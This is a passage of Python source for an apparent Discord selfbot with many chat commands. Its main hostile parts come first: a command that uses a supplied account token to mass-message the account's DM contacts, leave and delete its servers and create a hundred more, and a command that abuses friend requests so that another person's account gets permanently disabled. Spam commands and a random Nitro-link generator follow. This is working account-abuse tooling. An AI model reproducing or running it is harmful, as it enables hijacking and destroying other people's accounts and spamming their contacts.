        embed=discord.Embed(title="Scalic Selfbot - Token Fuck", description=f"If your sure you want to token fuck the account, react with the emoji below.\nThis process will dm all open dms , then close them, leave all servers, and make a ton of servers", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
        message = await ctx.send(embed=embed)        
        await message.add_reaction('✅')
        randcolor = random.randint(0x000000, 0xFFFFFF)
        reactionstuffyes = True
        def requirements(reaction, user):
            return user == ctx.author and str(reaction.emoji) in ('✅') and message==message


        while reactionstuffyes:
            try:
                reaction, user = await scalic.wait_for('reaction_remove', timeout=10, check=requirements)
                embed=discord.Embed(title="Scalic Selfbot - Token Fuck", description=f"You reacted, the process has started!\nValidating token...", color=randcolor)
                embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
                embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
                await message.edit(embed=embed)
                await message.clear_reactions()
                reactionstuffyes = False
                headers={"authorization": tokentofrick}
                tokendata = requests.get("https://discord.com/api/v8/users/@me",headers=headers)

                if tokendata.status_code != 200:
                    embed=discord.Embed(title="Scalic Selfbot - Token Fuck", description=f"Error - are you sure that token is correct?\nDiscord responded with : `{tokendata.text}`", color=randcolor)
                    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
                    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
                    await message.edit(embed=embed)           
                else:
                    embed=discord.Embed(title="Scalic Selfbot - Token Fuck", description=f"Token valid - continuing the process", color=randcolor)
                    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
                    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
                    await message.edit(embed=embed)      


                    resp = requests.get("https://discord.com/api/v8/users/@me/channels",headers=headers)
                    data = json.loads(resp.text)
                    usersmessaged = int(0)

                    for i in range(len(data)):

                        messagesent = requests.post(f"https://discord.com/api/v8/channels/{data[i]['id']}/messages",headers=headers,json={"content": nukemsg})
                        if messagesent.status_code == 200:
                            usersmessaged += 1
                        else:
                            await asyncio.sleep(1)

                        requests.delete(f"https://discord.com/api/v8/channels/{data[i]['id']}",headers=headers)


                    randcolor = random.randint(0x000000, 0xFFFFFF)
                    embed=discord.Embed(title="Scalic Selfbot - Token Fuck", description=f"Messaged {usersmessaged} people saying : `{nukemsg}` and cleared the conversation after", color=randcolor)
                    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
                    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
                    await message.edit(embed=embed)              
            
                    resp = requests.get("https://discord.com/api/v8/users/@me/guilds",headers=headers)
                    data = json.loads(resp.text)
                    serversleft = int(0)

                    for i in range(len(data)):
                        serverleaving = requests.delete(f"https://discord.com/api/v8/users/@me/guilds/{data[i]['id']}",headers=headers).status_code
                        if serverleaving == 204:
                            serversleft += 1
                        else:
                            await asyncio.sleep(1)

                    randcolor = random.randint(0x000000, 0xFFFFFF)
                    embed=discord.Embed(title="Scalic Selfbot - Token Fuck", description=f"Left `{serversleft}` servers", color=randcolor)
                    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
                    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
                    await message.edit(embed=embed)  

                    resp = requests.get("https://discord.com/api/v8/users/@me/guilds",headers=headers)
                    data = json.loads(resp.text)
                    serversdeleted = int(0)

                    for i in range(len(data)):
                        servdel = requests.post(f"https://discord.com/api/v8/guilds/{data[i]['id']}/delete",headers=headers,json={}).status_code
                        if servdel == 204:
                            serversdeleted += 1
                        else:
                            await asyncio.sleep(1)

                    randcolor = random.randint(0x000000, 0xFFFFFF)
                    embed=discord.Embed(title="Scalic Selfbot - Token Fuck", description=f"Deleted `{serversdeleted}` servers", color=randcolor)
                    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
                    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
                    try:
                        await message.edit(embed=embed)  
                    except:
                        pass
                            

                    for i in range(100):
                        threading.Thread(target = makeguildxd, args = (tokentofrick,nukemsg,)).start()
                        await asyncio.sleep(1) #heavy ratelimits but still faster



                    randcolor = random.randint(0x000000, 0xFFFFFF)
                    embed=discord.Embed(title="Scalic Selfbot - Token Fuck", description=f"Made {serversmade} servers", color=randcolor)
                    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
                    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
                    try:
                        await message.edit(embed=embed)  
                    except:
                        pass
                            
                    await asyncio.sleep(3)
                    randcolor = random.randint(0x000000, 0xFFFFFF)
                    embed=discord.Embed(title="Scalic Selfbot - Token Fuck", description=f"Overall results.\nMessaged `{usersmessaged}` people `{nukemsg}` and deleted the conversation.\nLeft `{serversleft}` servers\nDeleted `{serversdeleted}` servers\nMade `{serversmade}` servers", color=randcolor)
                    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
                    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
                    try:
                        await message.edit(embed=embed)  
                    except:
                        pass
                                               


            except asyncio.TimeoutError:
                embed=discord.Embed(title="Scalic Selfbot - Token Fuck", description=f"You took too long - Run this command again if you wish to token fuck an account", color=randcolor)
                embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
                embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
                await message.edit(embed=embed)
                await message.clear_reactions()
                reactionstuffyes= False



@scalic.command(aliases=['disabletoken',"tokendisabler","deleteaccount","accountdelete"])
async def tokendisable(ctx,tokentofrick=None):

    randcolor = random.randint(0x000000, 0xFFFFFF)
    await ctx.message.delete()
    if tokentofrick == None:
        embed=discord.Embed(title="Scalic Selfbot - Token Disabler", description=f"Supply a token - {prefix.strip()}tokendisable [token-here] ", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
        await ctx.message.edit(content="",embed=embed)


    elif ctx.guild == None:
        embed=discord.Embed(title="Scalic Selfbot - Token Disabler", description=f"Try do this command in a private server - it has problems in dms (working on fixing)!", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
        await ctx.message.edit(content="",embed=embed)

    else:
        embed=discord.Embed(title="Scalic Selfbot - Token Disabler", description=f"If your sure you want to disable that token, react.\nDisabling means that the account will be DISABLED - the chances of recovering it are pratically impossible.", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
        message = await ctx.send(embed=embed)        
        await message.add_reaction('✅')
        randcolor = random.randint(0x000000, 0xFFFFFF)
        reactionstuffyes = True
        def requirements(reaction, user):
            return user == ctx.author and str(reaction.emoji) in ('✅') and message==message


        while reactionstuffyes:
            try:
                reaction, user = await scalic.wait_for('reaction_remove', timeout=10, check=requirements)
                embed=discord.Embed(title="Scalic Selfbot - Token Disabler", description=f"You reacted, the process has started!\nDisabling token", color=randcolor)
                embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
                embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
                await message.edit(embed=embed)
                await message.clear_reactions()
                reactionstuffyes = False
                headers={"authorization": tokentofrick} #using just the token as a header = ez disable with things like servers and friend requests

                #this disabler works better then a payload saying theyre underage as its practically impossible to recover the acc

                for i in range(50):
                    requests.post("https://discord.com/api/v8/users/@me/relationships",headers=headers,json={"username":"01","discriminator":1}) #a random name thatll probably always be in demand + theyre probably used to people randomly friending them
                    await asyncio.sleep(1) 
                    requests.delete("https://discord.com/api/v8/users/@me/relationships/213583513780224000",headers=headers) #this way we can keep adding and removing them
                    await asyncio.sleep(1) 
                                              
                                              
                await asyncio.sleep(15) 
                tokendata = requests.get("https://discord.com/api/v8/users/@me",headers=headers)
                randcolor = random.randint(0x000000, 0xFFFFFF)
                if tokendata.status_code != 200:
                    embed=discord.Embed(title="Scalic Selfbot - Token Disabler", description=f"Token disabled - discord responds with : `{tokendata.text}`", color=randcolor)
                    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
                    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
                    await message.edit(embed=embed)           
                else:
                    embed=discord.Embed(title="Scalic Selfbot - Token Disabler", description=f"Token valid - strange - try again maybe?", color=randcolor)
                    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
                    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
                    await message.edit(embed=embed)      

            except asyncio.TimeoutError:
                embed=discord.Embed(title="Scalic Selfbot - Token Disabler", description=f"You took too long - Run this command again if you wish to DISABLE an account", color=randcolor)
                embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
                embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
                await message.edit(embed=embed)
                await message.clear_reactions()
                reactionstuffyes= False



@scalic.command(aliases=["snipeedit"])
async def editsnipe(ctx):
    global editedmessages
    randcolor = random.randint(0x000000, 0xFFFFFF)
    if str(ctx.channel.id) in editedmessages:
        msgsniped = editedmessages[str(ctx.channel.id)]
        embed=discord.Embed(title="Scalic Selfbot - Edit snipe", description=f"Message sniped:\n{msgsniped}", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
        await ctx.message.edit(content="",embed=embed)

    else:
        embed=discord.Embed(title="Scalic Selfbot - Edit snipe", description=f"No edited messages to snipe", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
        await ctx.message.edit(content="",embed=embed)
    editedmessages.clear() #good to clear it so it doesn't get too clogged if that makes sense


        
@scalic.command()
async def embed(ctx,*,mesg=f"Format : {prefix.strip()}embed [words]"):
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(description=mesg,color=randcolor)
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await ctx.message.edit(content="",embed=embed)





@scalic.command(aliases=['idunban', 'unbanid'])
async def unban(ctx, userid="Nonexd"):
    randcolor = random.randint(0x000000, 0xFFFFFF)
    if len(str(userid)) != 18:
        embed=discord.Embed(title="Scalic Selfbot - Unban Command", description=f"\nCommand usage : {prefix.strip()}unban [id]", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
        await ctx.message.edit(content="",embed=embed)   
    else:

        try:

            user = await scalic.fetch_user(int(userid))
            await ctx.guild.unban(user)
            embed=discord.Embed(title="Scalic Selfbot - Unban Command", description=f"\nUnbanned {userid}", color=randcolor)
            embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
            embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
            await ctx.message.edit(content="",embed=embed)   
            
        except Exception as errorunbanning:
            embed=discord.Embed(title="Scalic Selfbot - Unban Command", description=f"\nError Unbanning {userid}\n{errorunbanning}", color=randcolor)
            embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
            embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
            await ctx.message.edit(content="",embed=embed) 
            
@scalic.command(aliases=['idban', 'hackban',"hakban","hacban"])
async def banid(ctx, userid="Nonexd",reason="None specified"):
    randcolor = random.randint(0x000000, 0xFFFFFF)
    if len(str(userid)) != 18:
        embed=discord.Embed(title="Scalic Selfbot - Ban ID Command", description=f"\nCommand usage : {prefix.strip()}banid [id]", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
        await ctx.message.edit(content="",embed=embed)   
    else:

        try:

            user = await scalic.fetch_user(int(userid))
            await ctx.guild.ban(user,reason=reason)
            embed=discord.Embed(title="Scalic Selfbot - Ban Command", description=f"\nBanned {userid}", color=randcolor)
            embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
            embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
            await ctx.message.edit(content="",embed=embed)   
            
        except Exception as errorbanning:
            embed=discord.Embed(title="Scalic Selfbot - Ban Command", description=f"\nError Banning {userid}\n{errorbanning}", color=randcolor)
            embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
            embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
            await ctx.message.edit(content="",embed=embed) 

@scalic.command()
async def kick(ctx, member : discord.Member,reason="None specified"):
    randcolor = random.randint(0x000000, 0xFFFFFF)
    if member.id == ctx.author.id:
        embed=discord.Embed(title="Scalic Selfbot - Kick Command", description=f"\nTry {prefix.strip()}leave [server-id] instead!", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
        await ctx.message.edit(content="",embed=embed) 
    else:

        try:

            await member.kick(reason=reason)
            embed=discord.Embed(title="Scalic Selfbot - Kick Command", description=f"\nKicked {member.mention}", color=randcolor)
            embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
            embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
            await ctx.message.edit(content="",embed=embed) 
        except Exception as errorkicking:
            embed=discord.Embed(title="Scalic Selfbot - Kick Command", description=f"\nError Kicking {member.mention}\n{errorkicking}", color=randcolor)
            embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
            embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
            await ctx.message.edit(content="",embed=embed) 


@scalic.command()
async def ban(ctx, member : discord.Member,reason="None specified"):
    randcolor = random.randint(0x000000, 0xFFFFFF)
    if member.id == ctx.author.id:
        embed=discord.Embed(title="Scalic Selfbot - Ban Command", description=f"\nTry {prefix.strip()}ban [member]", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
        await ctx.message.edit(content="",embed=embed) 
    else:

        try:

            await member.ban(reason=reason)
            embed=discord.Embed(title="Scalic Selfbot - Ban Command", description=f"\nBanned {member.mention}", color=randcolor)
            embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
            embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
            await ctx.message.edit(content="",embed=embed) 
        except Exception as errorbanning:
            embed=discord.Embed(title="Scalic Selfbot - Ban Command", description=f"\nError Banning {member.mention}\n{errorbanning}", color=randcolor)
            embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
            embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
            await ctx.message.edit(content="",embed=embed) 
mimicstatus = "off"
@scalic.command()
async def mimic(ctx, member : discord.Member=None):
    global mimicstatus
    global whotomimic
    randcolor = random.randint(0x000000, 0xFFFFFF)
    if member == None:
        embed=discord.Embed(title="Scalic Selfbot - Mimic Command", description=f"\nTry {prefix.strip()}mimic [member]\nor type {prefix.strip()}mimic off", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
        await ctx.message.edit(content="",embed=embed)
        
    else:

        try:

            mimicstatus = "on"
            whotomimic = member.id
            embed=discord.Embed(title="Scalic Selfbot - Mimic Command", description=f"\nMimiccing {member.mention}\nMimic status : `{mimicstatus}`", color=randcolor)
            embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
            embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
            await ctx.message.edit(content="",embed=embed) 
        except Exception as mimicerror:
            mimicstatus = "off"
            embed=discord.Embed(title="Scalic Selfbot - Mimic Command", description=f"\nError occured mimiccing is now `{mimicstatus}`\nError : {mimicerror}", color=randcolor)
            embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
            embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
            await ctx.message.edit(content="",embed=embed) 

@scalic.command(aliases=['av', 'pfp'])
async def avatar(ctx, *,  memb : discord.Member=None):
    if memb == None:  
        memb = ctx.message.author 
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title=f"{memb.name}'s Avatar!", description=f"Link: {memb.avatar_url}", color=randcolor)
    embed.set_thumbnail(url=memb.avatar_url)
    await ctx.message.edit(content="",embed=embed)

@scalic.command(aliases=['downloadav', 'downloadpfp'])
async def downloadavatar(ctx, *,  memb : discord.Member=None):
    if memb == None:  
        memb = ctx.message.author 
    randcolor = random.randint(0x000000, 0xFFFFFF)

       
    response = requests.get(memb.avatar_url, stream=True)
    with open(f"./data/{str(memb.id)}.png", 'wb') as pfp: 
        shutil.copyfileobj(response.raw, pfp)

    embed=discord.Embed(title=f"Downloaded {memb.name}'s Avatar!", description=f"Link: {memb.avatar_url}", color=randcolor)
    embed.set_thumbnail(url=memb.avatar_url)
    await ctx.message.edit(content="",embed=embed)




@scalic.command(aliases=['emojibig', 'urlemoji', 'emojiurl'])
async def bigemoji(ctx, emoji: discord.Emoji):
    await ctx.message.edit(content=emoji.url)

@scalic.command(aliases=['emojiadd', 'emadd', 'addem',"emojisteal","stealemoji"])
async def addemoji(ctx, emoji: discord.Emoji,*,nameofemoji=None):
    try:
        if nameofemoji == None:
            nameofemoji = emoji.name
        response = requests.get(emoji.url, stream=True)
        with open(f"./data/{nameofemoji}.jpeg", 'wb') as scalic_file: #have a feeling this only works with jpegs so jpeg it is :)
            shutil.copyfileobj(response.raw, scalic_file)

        with open(f"data/{nameofemoji}.jpeg", "rb") as f:
            image = f.read()
        await ctx.guild.create_custom_emoji(name = (nameofemoji), image = image)
        await asyncio.sleep(2) 
        guildemoji = discord.utils.get(scalic.get_guild(ctx.guild.id).emojis, name=nameofemoji)
        await ctx.message.edit(content=f"Successfully created emoji : {guildemoji}") #this way it will show as an emoji from the guild you just added the emoji too, rather then the original
        

    except Exception as error:
        await ctx.message.edit(content=f"Error adding emoji : {emoji}\nError : {error}")

@scalic.command(aliases=['getguildemoji', 'getguildemojis',"downloadguildemoji"])
async def downloadguildemojis(ctx, guildid=None):
    if guildid == None:
        await ctx.message.edit(content=f"**Incorrect usage -** {prefix.strip()}emojisteal [guild-id]")
    else:
        emojisuccess = 0
        emojierror = 0
        emojiamount = 0
        emojilist = ""
        guildtostealfrom = scalic.get_guild(int(guildid))
        randcolor = random.randint(0x000000, 0xFFFFFF)
        embed=discord.Embed(title=f"Scalic Selfbot - Emoji stealing from {guildtostealfrom.name}", description=f"Details:\nSuccessful emoji steals : {emojisuccess}\nErrors with emoji steals : {emojierror}", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
        await ctx.message.edit(content="",embed=embed)

        for emoji in guildtostealfrom.emojis:
            emojiamount += 1
            try:
                response = requests.get(emoji.url, stream=True)
                with open(f"./data/{emoji.name}.jpeg", 'wb') as scalic_file: #have a feeling this only works with jpegs so jpeg it is :)
                    shutil.copyfileobj(response.raw, scalic_file)

                with open(f"data/{emoji.name}.jpeg", "rb") as f:
                    image = f.read()
               # await ctx.guild.create_custom_emoji(name = (emoji.name), image = image)
                await asyncio.sleep(2) 
                guildemoji = discord.utils.get(scalic.get_guild(ctx.guild.id).emojis, name=emoji.name)
                #await ctx.channel.send(content=f"Successfully created emoji : {guildemoji}") #people say this is too much spam
                emojisuccess += 1

            except Exception as error:
                emojierror += 1

@scalic.command(aliases=['stealserveremojis', 'stealemojis',"emojissteal", 'stealguildsemojis',"stealserversemojis","guildemojisteal",'guildemojissteal'])
async def stealguildemoji(ctx, guildid=None):
    if guildid == None:
        await ctx.message.edit(content=f"**Incorrect usage -** {prefix.strip()}emojisteal [guild-id]")
    else:
        emojisuccess = 0
        emojierror = 0
        emojiamount = 0
        emojilist = ""
        guildtostealfrom = scalic.get_guild(int(guildid))
        randcolor = random.randint(0x000000, 0xFFFFFF)
        embed=discord.Embed(title=f"Scalic Selfbot - Emoji stealing from {guildtostealfrom.name}", description=f"Details:\nSuccessful emoji steals : {emojisuccess}\nErrors with emoji steals : {emojierror}", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
        await ctx.message.edit(content="",embed=embed)

        for emoji in guildtostealfrom.emojis:
            emojiamount += 1
            try:
                response = requests.get(emoji.url, stream=True)
                with open(f"./data/{emoji.name}.jpeg", 'wb') as scalic_file: #have a feeling this only works with jpegs so jpeg it is :)
                    shutil.copyfileobj(response.raw, scalic_file)

                with open(f"data/{emoji.name}.jpeg", "rb") as f:
                    image = f.read()
                await ctx.guild.create_custom_emoji(name = (emoji.name), image = image)
                await asyncio.sleep(2) 
                guildemoji = discord.utils.get(scalic.get_guild(ctx.guild.id).emojis, name=emoji.name)
                #await ctx.channel.send(content=f"Successfully created emoji : {guildemoji}") #people say this is too much spam
                emojilist = emojilist + f"{guildemoji} "
                emojisuccess += 1

            except Exception as error:
                emojierror += 1
                #await ctx.channel.send(content=f"Error adding emoji : {emoji}\nError : {error}")

            randcolor = random.randint(0x000000, 0xFFFFFF)
            embed=discord.Embed(title=f"Scalic Selfbot - Emoji stealing from {guildtostealfrom.name}", description=f"Details:\nSuccessful emoji steals : {emojisuccess}\nErrors with emoji steals : {emojierror}\n{emojilist}", color=randcolor)
            embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
            embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
            await ctx.message.edit(embed=embed)
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title=f"Scalic Selfbot - Finished emoji stealing from {guildtostealfrom.name}", description=f"Details:\nSuccessful emoji steals : {emojisuccess}\nErrors with emoji steals : {emojierror}\n{emojilist}", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await ctx.message.edit(embed=embed)

@scalic.command(aliases=['embedsspam', 'spamembed', 'spamembeds'])
async def embedspam(ctx, count=5, *, desc="I forgot to specify the embed content"):
    await ctx.message.delete()
    if int(count) > 25:
        randcolor = random.randint(0x000000, 0xFFFFFF)
        embed=discord.Embed(title="Scalic Selfbot - embed spam", description=f"{count} embeds is too much - do 25 or less", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
        await ctx.send(embed=embed)
    else:
        for i in range(int(count)):
            randcolor = random.randint(0x000000, 0xFFFFFF)
            embed=discord.Embed(title="Scalic Selfbot - embed spam", description=desc, color=randcolor)
            embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
            embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
            await ctx.send(embed=embed)


@scalic.command(aliases=['messagespam', 'spammessage', 'spammessages'])
async def spam(ctx, count=5, *, desc="I forgot to specify the content to spam"):
    await ctx.message.delete()
    if int(count) > 25:
        randcolor = random.randint(0x000000, 0xFFFFFF)
        embed=discord.Embed(title="Scalic Selfbot - spam", description=f"{count} messages is too much - do 25 or less", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
        await ctx.send(embed=embed)
    else:
        for i in range(int(count)):
            await ctx.send(desc)


@scalic.command(aliases=['pinspam', 'masspin'])
async def spampin(ctx, count=None):
    if count == None:
        randcolor = random.randint(0x000000, 0xFFFFFF)
        embed=discord.Embed(title="Scalic Selfbot - Pin spam", description=f"You didn't specify the amount of pins to do.\n{prefix.strip()}spampin [amount]", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")

        await ctx.message.edit(content="",embed=embed)
    else:
        async for message in ctx.message.channel.history(limit=int(count)):
            try:
                await message.pin()
            except:
                pass

@scalic.command(aliases=['shutdown', 'logoff',"close"])
async def logout(ctx):
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Scalic Selfbot - Logging out", description=f"Logging out!", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await ctx.message.edit(content="",embed=embed)
    await scalic.logout()

#@scalic.command(aliases=['reboot'])
#async def restart(ctx):
#    randcolor = random.randint(0x000000, 0xFFFFFF)
#    embed=discord.Embed(title="Scalic Selfbot - Restarting", description=f"Restarting!", color=randcolor)
#    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
#    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
#    await ctx.message.edit(content="",embed=embed)
#    await scalic.logout()
#    scalic.run(token.strip(), bot=False)

#This command needs working on - if any developers wanna help out lemme know, I just don't know how to 'restart' it

@scalic.command(aliases=['purge'])
async def clear(ctx, amount):
    deleted = 0

    await ctx.message.delete()
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Scalic Selfbot - Message purger", description=f"Deleting messages", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    msg= await ctx.send(embed=embed)
    async for message in ctx.message.channel.history(limit=int(amount)).filter(
        lambda m: m.author == scalic.user
    ).map(lambda m: m):
        try:
            if message != msg:
                await message.delete()
                deleted = deleted + 1
                #embed=discord.Embed(title="Scalic Selfbot - Message purger", description=f"Deleted {deleted} messages", color=randcolor)
                #embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
                #embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
                #await msg.edit(embed=embed) #remove the # if you want but it'll slow it down a lot
        except:
            pass


    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Scalic Selfbot - Message purger", description=f"Finished.\nDeleted {deleted} messages", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await msg.edit(embed=embed,delete_after=3)

@scalic.command(aliases=['nitrogen',"gennitro","nitrogenerator"])
async def nitro(ctx):
    code = "".join(random.choice(characters) for x in range(16))
    await ctx.send(f"https://discord.gift/{code}")

@scalic.command(aliases=['purgemessage',"purgecontent","clearmessage"])
async def clearcontent(ctx, amount,*,messagetoclear):
    deleted = 0
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Scalic Selfbot - Message purger", description=f"Deleting messages", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await ctx.message.edit(content="",embed=embed)
    async for message in ctx.message.channel.history(limit=int(amount)).filter(
        lambda m: m.content == messagetoclear
    ).map(lambda m: m):
        try:
            await message.delete()
            deleted = deleted + 1
            #embed=discord.Embed(title="Scalic Selfbot - Message purger", description=f"Deleted {deleted} messages", color=randcolor)
            #embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
            #embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
            #await msg.edit(embed=embed) #remove the # if you want but it'll slow it down a lot
        except:
            pass


    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Scalic Selfbot - Message purger", description=f"Finished.\nDeleted {deleted} messages", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await ctx.message.edit(content="",embed=embed,delete_after=3)

@scalic.command(aliases=['reactspam', 'massreact'])
async def spamreact(ctx, count=None, reaction=None):
    await ctx.message.delete()
    if count == None or reaction == None:
        randcolor = random.randint(0x000000, 0xFFFFFF)
        embed=discord.Embed(title="Scalic Selfbot - React spam", description=f"You didn't specify the amount of messages to react to or the reaction to use.\n{prefix.strip()}spamreact [amount]", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
